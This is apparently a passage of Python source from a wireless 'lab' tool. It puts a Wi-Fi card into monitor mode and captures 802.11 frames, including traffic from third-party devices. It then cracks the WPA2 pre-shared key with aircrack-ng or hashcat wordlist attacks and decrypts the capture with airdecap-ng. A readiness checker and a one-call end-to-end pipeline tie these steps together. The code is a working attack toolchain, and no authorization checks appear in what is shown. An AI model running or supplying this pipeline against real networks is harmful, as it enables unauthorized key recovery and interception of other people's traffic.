                state="captured_handshake_insufficient",
                status="unsupported",
                handshake_cap_value=str(cap_path),
                handshake_artifact=artifact.kind,
                crack_ready=False,
                decrypt_ready=decrypt_ready,
                summary="The capture is too small and does not contain a usable WPA artifact.",
                detail=artifact.detail,
                reasons=reasons,
            )
        if artifact.kind == "partial_handshake":
            reasons = _dedupe_reasons(artifact.reasons, capture_condition_reasons, retry_capture_reasons)
            return _build_readiness(
                state="unsupported",
                status="unsupported",
                handshake_cap_value=str(cap_path),
                handshake_artifact=artifact.kind,
                crack_ready=False,
                decrypt_ready=decrypt_ready,
                summary="Only a partial WPA handshake is present.",
                detail=artifact.detail,
                reasons=reasons,
            )
        if artifact.kind == "pmkid_only":
            reasons = _dedupe_reasons(
                artifact.reasons,
                capture_condition_reasons,
                (
                    make_blocker(
                        "wpa.supported_path_requires_handshake",
                        "The current supported crack/decrypt path still requires a full WPA handshake.",
                        remediation="Capture a full WPA handshake before expecting the supported recovery path to be ready.",
                    ),
                ),
                retry_capture_reasons,
            )
            return _build_readiness(
                state="unsupported",
                status="unsupported",
                handshake_cap_value=str(cap_path),
                handshake_artifact=artifact.kind,
                crack_ready=False,
                decrypt_ready=False,
                summary="The capture contains PMKID evidence, but the current supported path still needs a full WPA handshake.",
                detail=f"{artifact.detail} The current crack/decrypt flow only treats full WPA handshakes as ready for supported recovery.",
                reasons=reasons,
            )
        if artifact.kind == "no_usable_artifact":
            reasons = _dedupe_reasons(artifact.reasons, capture_condition_reasons, retry_capture_reasons)
            return _build_readiness(
                state="unsupported",
                status="unsupported",
                handshake_cap_value=str(cap_path),
                handshake_artifact=artifact.kind,
                crack_ready=False,
                decrypt_ready=False,
                summary="The capture does not contain a usable WPA artifact.",
                detail=artifact.detail,
                reasons=reasons,
            )
        if capture_conditions_blocked:
            reasons = _dedupe_reasons(artifact.reasons, capture_condition_reasons)
            return _build_readiness(
                state="unsupported",
                status="unsupported",
                handshake_cap_value=str(cap_path),
                handshake_artifact=artifact.kind,
                crack_ready=False,
                decrypt_ready=False,
                summary="The capture does not match the configured WPA target conditions.",
                detail="The handshake artifact is usable, but the capture conditions do not line up with the configured target.",
                reasons=reasons,
            )

        if password:
            status = "supported" if decrypt_ready else "supported_with_limits"
            detail = f"{artifact.detail} Known PSK supplied."
            reasons = list(_dedupe_reasons(artifact.reasons, capture_condition_reasons)) + [
                make_context(
                    "wpa.known_key_supplied",
                    "A WPA key is already configured, so cracking is not required.",
                )
            ]
            if has_airdecap:
                reasons.append(
                    make_context(
                        "wpa.decrypt_tool_available",
                        "airdecap-ng is available for the decrypt step.",
                    )
                )
            if not essid:
                detail += " Decryption still needs ap_essid in lab.json."
                reasons.append(
                    make_limitation(
                        "wpa.ap_essid_missing",
                        "ap_essid is missing for the decrypt step.",
                        remediation="Set ap_essid in lab.json before expecting airdecap-ng output.",
                    )
                )
            elif not has_airdecap:
                detail += " Decryption still needs airdecap-ng installed."
                reasons.append(
                    make_limitation(
                        "wpa.decrypt_tool_missing",
                        "airdecap-ng is missing for the decrypt step.",
                        remediation="Install airdecap-ng before expecting a supported decrypt path.",
                    )
                )
            merged_reasons = tuple(reasons)
            return _build_readiness(
                state="known_key_supplied",
                status=status,
                handshake_cap_value=str(cap_path),
                handshake_artifact=artifact.kind,
                crack_ready=True,
                decrypt_ready=decrypt_ready,
                summary="A WPA key is already configured, so cracking is not required.",
                detail=detail,
                reasons=merged_reasons,
            )

        crack_tool_ready = artifact_supports_crack and not capture_conditions_blocked and (has_aircrack or (has_hashcat and has_converter))
        if crack_tool_ready and wordlist_ready:
            detail_parts = [artifact.detail]
            reasons = list(_dedupe_reasons(artifact.reasons, capture_condition_reasons)) + list(wordlist_reasons) + [
                make_context(
                    "wpa.handshake_present",
                    "A usable WPA handshake is present and recovery can be attempted.",
                )
            ]
            if has_aircrack:
                detail_parts.append("aircrack-ng dictionary attack is available")
                reasons.append(make_context("wpa.aircrack_available", "aircrack-ng is available for dictionary attacks."))
            if has_hashcat and has_converter:
                detail_parts.append(f"hashcat conversion path is available via {converter_name}")
                reasons.append(make_context("wpa.hashcat_path_available", "hashcat plus capture conversion tooling is available."))
            if has_airdecap:
                detail_parts.append("airdecap-ng is available for the decrypt step")
                reasons.append(make_context("wpa.decrypt_tool_available", "airdecap-ng is available for the decrypt step."))
            if not essid:
                detail_parts.append("set ap_essid before expecting airdecap-ng output")
                reasons.append(
                    make_limitation(
                        "wpa.ap_essid_missing",
                        "ap_essid is missing for the decrypt step.",
                        remediation="Set ap_essid before expecting airdecap-ng output.",
                    )
                )
            if not has_airdecap:
                detail_parts.append("install airdecap-ng for the decrypt step")
                reasons.append(
                    make_limitation(
                        "wpa.decrypt_tool_missing",
                        "airdecap-ng is missing for the decrypt step.",
                        remediation="Install airdecap-ng before expecting a supported decrypt path.",
                    )
                )
            merged_reasons = tuple(reasons)
            return _build_readiness(
                state="known_wordlist_attack_supported",
                status="supported_with_limits",
                handshake_cap_value=str(cap_path),
                handshake_artifact=artifact.kind,
                crack_ready=True,
                decrypt_ready=bool(essid and has_airdecap and artifact_supports_decrypt),
                summary="A valid WPA handshake is present and a wordlist-based WPA recovery can be attempted.",
                detail=". ".join(part[0].upper() + part[1:] for part in detail_parts) + ".",
                reasons=merged_reasons,
            )

        missing: List[str] = []
        reasons: List[Reason] = list(_dedupe_reasons(artifact.reasons, capture_condition_reasons)) + [
            make_blocker(
                "wpa.path_not_ready",
                "The capture exists, but the supported WPA recovery path is not ready.",
            )
        ]
        if wordlist_ready:
            reasons.extend(wordlist_reasons)
        else:
            missing.append("a real wordlist_path")
            reasons.extend(wordlist_reasons)
        if has_aircrack:
            reasons.append(make_context("wpa.aircrack_available", "aircrack-ng is available for dictionary attacks."))
        else:
            reasons.append(
                make_limitation(
                    "wpa.aircrack_missing",
                    "aircrack-ng is not available.",
                    remediation="Install aircrack-ng if you want the built-in dictionary attack path.",
                )
            )
        if has_hashcat:
            if has_converter:
                reasons.append(
                    make_context(
                        "wpa.hashcat_path_available",
                        "hashcat plus capture conversion tooling is available.",
                        detail=f"Converter: {converter_name}.",
                    )
                )
            else:
                reasons.append(
                    make_blocker(
                        "wpa.hashcat_converter_missing",
                        "The hashcat conversion helper is missing.",
                        remediation="Install cap2hccapx or hcxpcapngtool before relying on the hashcat path.",
                    )
                )
        else:
            reasons.append(
                make_limitation(
                    "wpa.hashcat_missing",
                    "hashcat is not available.",
                    remediation="Install hashcat if you want the alternate WPA crack backend.",
                )
            )
        if not has_aircrack and not has_hashcat:
            missing.append("aircrack-ng or hashcat")
            reasons.append(
                make_blocker(
                    "wpa.crack_toolchain_missing",
                    "No supported crack toolchain is available.",
                    remediation="Install aircrack-ng, or install hashcat plus cap2hccapx/hcxpcapngtool.",
                )
            )
        elif has_hashcat and not has_converter and not has_aircrack:
            missing.append("cap2hccapx or hcxpcapngtool for hashcat conversion")
        if not has_airdecap:
            missing.append("airdecap-ng for the decrypt step")
            reasons.append(
                make_blocker(
                    "wpa.decrypt_tool_missing",
                    "airdecap-ng is missing for the decrypt step.",
                    remediation="Install airdecap-ng before expecting a supported decrypt path.",
                )
            )
        else:
            reasons.append(
                make_context(
                    "wpa.decrypt_tool_available",
                    "airdecap-ng is available for the decrypt step.",
                )
            )
        if not essid:
            missing.append("ap_essid for the decrypt step")
            reasons.append(
                make_blocker(
                    "wpa.ap_essid_missing",
                    "ap_essid is missing for the decrypt step.",
                    remediation="Set ap_essid before expecting decrypted output.",
                )
            )
        else:
            reasons.append(make_context("wpa.ap_essid_present", "ap_essid is configured for the decrypt step."))
        reasons.extend(retry_capture_reasons)

        merged_reasons = tuple(reasons)
        return _build_readiness(
            state="unsupported",
            status="unsupported",
            handshake_cap_value=str(cap_path),
            handshake_artifact=artifact.kind,
            crack_ready=False,
            decrypt_ready=False,
            summary="The capture exists, but the supported WPA recovery path is not ready.",
            detail="Missing prerequisites: " + ", ".join(missing) + ".",
            reasons=merged_reasons,
        )

    def print_wpa_crack_status(self, handshake_cap: Optional[str] = None) -> WPACrackReadiness:
        readiness = self.inspect_wpa_crack_path(handshake_cap)
        label = readiness.status.replace("_", " ")
        if readiness.status == "supported":
            state_color = ok
        elif readiness.status == "supported_with_limits":
            state_color = warn
        else:
            state_color = err

        section("WPA Crack Readiness")
        info(f"State: {readiness.state}")
        state_color(f"Status: {label}")
        info(f"Handshake: {readiness.handshake_cap or '(none)'}")
        info(f"Artifact: {readiness.handshake_artifact or '(unknown)'}")
        info(readiness.summary)
        info(readiness.detail)
        for step in readiness.next_steps:
            info(f"Next: {step}")
        return readiness

    # ------------------------------------------------------------------
    # Original helpers (unchanged)
    # ------------------------------------------------------------------

    def build_capture_filter(self) -> Optional[str]:
        macs = [item for item in self.config.get("target_macs", []) if item]
        if not macs:
            return None
        return " or ".join(f"ether host {mac}" for mac in macs)

    def _ensure_interface(self) -> Optional[str]:
        interface = str(self.config.get("interface") or "").strip()
        if not interface:
            err("No capture interface configured. Run the config command first.")
            return None
        return interface

    # ------------------------------------------------------------------
    # Standard Windows dumpcap capture (original, unchanged)
    # ------------------------------------------------------------------

    def run(self, interactive: bool = True) -> Optional[str]:
        """
        Standard pcap capture using dumpcap (cross-platform: Windows, Linux, macOS).
        Falls back to tcpdump when dumpcap is not available on Linux/macOS.
        """
        section("Stage 1 - Capture")
        if maybe_elevate_for_capture(interactive=interactive):
            return None

        dumpcap = shutil.which("dumpcap")
        if not dumpcap:
            if not IS_WINDOWS:
                info("dumpcap not found — falling back to tcpdump.")
                return self._run_tcpdump_capture()
            err("dumpcap not found. Install Wireshark with NPcap and add it to PATH.")
            return None

        interface = self._ensure_interface()
        if not interface:
            return None

        self.output_dir.mkdir(parents=True, exist_ok=True)
        capture_filter = self.build_capture_filter()
        duration = int(self.config.get("capture_duration", 60) or 0)

        cmd = [dumpcap, "-i", interface, "-w", str(self.raw_capture)]
        if capture_filter:
            cmd.extend(["-f", capture_filter])
        if duration > 0:
            cmd.extend(["-a", f"duration:{duration}"])

        info(f"Interface: {interface}")
        info(f"Filter: {capture_filter or '(none)'}")
        info(f"Output: {self.raw_capture}")

        result = subprocess.run(cmd, capture_output=True, text=True, check=False)
        if result.returncode != 0:
            stderr = result.stderr.strip() or result.stdout.strip()
            err(f"Capture failed: {stderr or 'unknown dumpcap error'}")
            return None

        if not self.raw_capture.exists() or self.raw_capture.stat().st_size == 0:
            err("Capture finished without writing a pcap.")
            return None

        ok(f"Capture saved to {self.raw_capture}")
        return str(self.raw_capture)

    def _run_tcpdump_capture(self) -> Optional[str]:
        """
        Fallback capture using tcpdump (Linux / macOS) when dumpcap is absent.
        Writes a standard pcap to the same raw_capture path.
        """
        tcpdump = _require("tcpdump")
        if not tcpdump:
            err("Neither dumpcap nor tcpdump found. Install Wireshark or tcpdump.")
            return None

        interface = self._ensure_interface()
        if not interface:
            return None

        self.output_dir.mkdir(parents=True, exist_ok=True)
        capture_filter = self.build_capture_filter()
        duration = int(self.config.get("capture_duration", 60) or 0)

        cmd = ["tcpdump", "-i", interface, "-w", str(self.raw_capture)]
        if duration > 0:
            cmd.extend(["-G", str(duration), "-W", "1"])
        if capture_filter:
            cmd.append(capture_filter)

        info(f"Interface : {interface}")
        info(f"Filter    : {capture_filter or '(none)'}")
        info(f"Output    : {self.raw_capture}")
        info(f"Duration  : {duration}s" if duration else "Duration  : manual stop (Ctrl-C)")

        try:
            subprocess.run(cmd, capture_output=True, text=True, timeout=(duration + 5) if duration else None, check=False)
        except subprocess.TimeoutExpired:
            pass

        if not self.raw_capture.exists() or self.raw_capture.stat().st_size == 0:
            err("tcpdump finished without writing a pcap.")
            return None

        ok(f"Capture saved to {self.raw_capture}")
        return str(self.raw_capture)

    def run_monitor(
        self,
        method: str = "airodump",   # "airodump" | "besside" | "tcpdump"
        interactive: bool = True,
    ) -> Optional[str]:
        """
        Full wi-fi lab pipeline:
          1. Enable monitor mode  (airmon-ng on Linux, WlanHelper on Windows)
          2. Capture raw 802.11 frames including frames from third-party clients
             that would be invisible to a normal managed-mode capture.
          3. Return path to the raw .cap file.

        `method` choices:
          "airodump"  — targeted (needs ap_bssid + ap_channel in config)
          "besside"   — automatic sweep / single AP
          "tcpdump"   — generic monitor-mode dump (tcpdump on Linux/macOS, dumpcap -I on Windows)
        """
        section("Stage 1 - Monitor-Mode Capture")

        if maybe_elevate_for_capture(interactive=interactive):
            return None

        if IS_MACOS:
            # macOS: tcpdump -I puts the interface into monitor mode natively
            interface = self._ensure_interface()
            if not interface:
                return None
            self.output_dir.mkdir(parents=True, exist_ok=True)
            return self._run_tcpdump_monitor_macos(interface)

        interface = self._ensure_interface()
        if not interface:
            return None

        self.output_dir.mkdir(parents=True, exist_ok=True)

        # Step 1 — enable monitor mode
        self._monitor = MonitorMode(interface)
        mon_iface = self._monitor.enable()
        if not mon_iface:
            return None

        # Step 2 — capture
        self._handshake = HandshakeCapture(self.config, self.output_dir)
        cap_path: Optional[str] = None

        if method == "besside":
            cap_path = self._handshake.capture_besside(mon_iface)
        elif method == "airodump":
            cap_path = self._handshake.capture_airodump(mon_iface)
        elif method == "tcpdump":
            if IS_WINDOWS:
                cap_path = self._run_dumpcap_monitor_windows(mon_iface)
            else:
                cap_path = self._run_tcpdump_monitor(mon_iface)
        else:
            err(f"Unknown monitor capture method: {method}")

        if not cap_path:
            self._monitor.disable()
            return None

        ok(f"Raw 802.11 capture: {cap_path}")
        return cap_path

    def _run_dumpcap_monitor_windows(self, interface: str) -> Optional[str]:
        """
        Windows generic monitor capture using dumpcap.
        Requires Npcap monitor mode support and an adapter/driver that supports it.
        """
        dumpcap = _require("dumpcap")
        if not dumpcap:
            return None

        out = self.output_dir / "monitor_raw.pcap"
        duration = int(self.config.get("capture_duration", 60) or 60)

        cmd = [dumpcap, "-I", "-i", interface, "-w", str(out), "-F", "pcap"]
        if duration > 0:
            cmd.extend(["-a", f"duration:{duration}"])

        info(f"dumpcap monitor mode (-I) on {interface} for {duration}s â€¦")
        result = subprocess.run(cmd, capture_output=True, text=True, check=False)
        if result.returncode != 0:
            stderr = result.stderr.strip() or result.stdout.strip()
            err(f"dumpcap monitor capture failed: {stderr or 'unknown dumpcap error'}")
            return None

        if out.exists() and out.stat().st_size > 0:
            ok(f"Monitor capture saved to {out}")
            return str(out)

        err("dumpcap monitor capture produced no output.")
        return None

    def _run_tcpdump_monitor(self, mon_iface: str) -> Optional[str]:
        """
        Simple tcpdump capture on the monitor interface.
        Captures ALL 802.11 frames visible on the air including traffic
        from third-party devices — the traffic that is invisible to a
        normal Windows managed-mode capture.
        """
        tcpdump = _require("tcpdump")
        if not tcpdump:
            return None

        out = self.output_dir / "monitor_raw.pcap"
        duration = int(self.config.get("capture_duration", 60) or 60)
        cmd = ["tcpdump", "-i", mon_iface, "-w", str(out), "-G", str(duration), "-W", "1"]

        info(f"tcpdump on {mon_iface} for {duration}s …")
        try:
            subprocess.run(cmd, capture_output=True, text=True, timeout=duration + 5, check=False)
        except subprocess.TimeoutExpired:
            pass

        if out.exists() and out.stat().st_size > 0:
            return str(out)
        err("tcpdump produced no output.")
        return None

    def _run_tcpdump_monitor_macos(self, interface: str) -> Optional[str]:
        """
        macOS monitor-mode capture: tcpdump -I puts the adapter into monitor mode.
        Requires root and a Wi-Fi interface (e.g. en0).
        """
        tcpdump = _require("tcpdump")
        if not tcpdump:
            return None

        out = self.output_dir / "monitor_raw.pcap"
        duration = int(self.config.get("capture_duration", 60) or 60)
        cmd = ["tcpdump", "-I", "-i", interface, "-w", str(out)]
        if duration > 0:
            cmd.extend(["-G", str(duration), "-W", "1"])

        info(f"tcpdump monitor mode (-I) on {interface} for {duration}s …")
        try:
            subprocess.run(cmd, capture_output=True, text=True,
                           timeout=duration + 5, check=False)
        except subprocess.TimeoutExpired:
            pass

        if out.exists() and out.stat().st_size > 0:
            ok(f"Monitor capture saved to {out}")
            return str(out)
        err("tcpdump -I produced no output. Ensure you are root and the interface supports monitor mode.")
        return None

    def disable_monitor(self) -> None:
        """Put the card back into managed mode."""
        if self._monitor:
            self._monitor.disable()

    # ------------------------------------------------------------------
    # WPA2 crack + airdecap pipeline (lab steps 5/6 → airdecap-ng)
    # ------------------------------------------------------------------

    def crack_and_decrypt(self, handshake_cap: Optional[str] = None) -> Optional[str]:
        """
        1. If no handshake_cap supplied, tries the last captured one.
        2. Cracks the PSK via aircrack-ng then hashcat.
        3. Stores the recovered PSK in config so strip_wifi_layer can use it.
        4. Calls strip_wifi_layer on the raw capture.
        Returns the path to the decrypted pcap, or None on failure.
        """
        section("WPA2 Crack + Decrypt")

        readiness = self.inspect_wpa_crack_path(handshake_cap)
        info(f"WPA path state: {readiness.state}")
        info(readiness.summary)
        if not readiness.crack_ready:
            err(readiness.detail)
            return None

        cap = readiness.handshake_cap
        if not cap:
            err("No handshake capture file available. Run run_monitor() first.")
            return None

        psk = resolve_wpa_password(self.config)
        if not psk:
            info("No PSK in config — attempting to crack handshake …")
            psk = self._cracker.crack(cap)
            if psk:
                # Inject recovered key back into config for airdecap-ng
                self.config["wpa_password"] = psk
            else:
                err("Could not recover WPA2 PSK. Decryption not possible.")
                return None
        else:
            ok(f"Using pre-configured PSK.")

        decrypt_readiness = self.inspect_wpa_crack_path(cap)
        if not decrypt_readiness.decrypt_ready:
            err(decrypt_readiness.detail)
            return None

        return self.strip_wifi_layer(pcap_path=cap)

    # ------------------------------------------------------------------
    # airdecap-ng step (original, unchanged)
    # ------------------------------------------------------------------

    def strip_wifi_layer(self, pcap_path: Optional[str] = None) -> Optional[str]:
        section("Stage 1b - Wi-Fi Layer Strip")
        source = Path(pcap_path or self.raw_capture)
        if not source.exists():
            err(f"Input capture not found: {source}")
            return None

        airdecap = shutil.which("airdecap-ng")
        if not airdecap:
            warn("airdecap-ng not found. Skipping Wi-Fi decryption step.")
            return str(source)

        essid = str(self.config.get("ap_essid") or "").strip()
        password = resolve_wpa_password(self.config)
        if not essid or not password:
            warn("ESSID or WPA password missing. Skipping Wi-Fi decryption step.")
            return str(source)

        info("Running airdecap-ng with the configured ESSID and WPA password.")
        output_dir = source.parent
        result = subprocess.run(
            [airdecap, "-e", essid, "-p", password, str(source)],
            cwd=str(output_dir),
            capture_output=True,
            text=True,
            check=False,
        )
        generated = source.with_name(source.stem + "-dec.pcapng")
        if not generated.exists():
            generated = source.with_name(source.stem + "-dec.pcap")
        if not generated.exists():
            warn(result.stdout.strip() or "airdecap-ng produced no output. Using the original pcap.")
            return str(source)

        if self.decrypted_capture.exists():
            self.decrypted_capture.unlink()
        generated.replace(self.decrypted_capture)
        done(f"Wi-Fi decrypted capture saved to {self.decrypted_capture}")
        return str(self.decrypted_capture)

    # ------------------------------------------------------------------
    # Convenience: full end-to-end wi-fi lab pipeline in one call
    # ------------------------------------------------------------------

    def run_full_wifi_pipeline(self, method: str = "airodump", interactive: bool = True) -> Optional[str]:
        """
        Convenience wrapper that runs the complete pipeline:
          enable monitor → capture → crack PSK → airdecap-ng → return decrypted pcap

        On Windows, this uses aircrack-ng suite directly without airmon-ng.
        After this returns, pass the result into StreamExtractor.extract()
        and it will now see all IPv6, ICMP, SCTP, and third-party traffic
        because the Wi-Fi encryption has been stripped.
        """
        cap = self.run_monitor(method=method, interactive=interactive)
        if not cap:
            self.disable_monitor()
            return None
        decrypted = self.crack_and_decrypt(handshake_cap=cap)
        self.disable_monitor()
        return decrypted
